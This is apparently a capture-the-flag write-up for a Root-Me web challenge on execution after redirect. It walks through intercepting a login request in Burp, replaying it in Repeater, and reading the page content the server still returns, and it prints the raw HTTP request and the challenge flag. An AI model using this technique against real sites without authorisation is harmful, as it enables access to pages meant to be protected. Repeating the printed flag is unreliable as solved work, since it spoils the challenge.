---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 12
---

> Get access to index.

![1](https://github.com/Knign/Write-ups/assets/110326359/db836239-e4cf-48e4-b7b9-a7004d106dc9)

Let's enter `admin` in both the fields and intercept the request.

![2](https://github.com/Knign/Write-ups/assets/110326359/3ed4bee0-ad4b-4868-b62c-c20505f4a05d)

We can now forward the request to the `Repeater` and  modify it.

## HTTP Request
```
POST /web-serveur/ch32/index.php HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://challenge01.root-me.org
DNT: 1
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1697428943.14.1.1697430697.0.0.0; _ga=GA1.1.1863804672.1697290591
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

login=admin&password=admin
```

Finally we have to send it to the server.

![3](https://github.com/Knign/Write-ups/assets/110326359/1ee37ac1-f282-4e3a-bedd-554aa9f981ea)

## Flag
```
ExecutionAfterRedirectIsBad
```
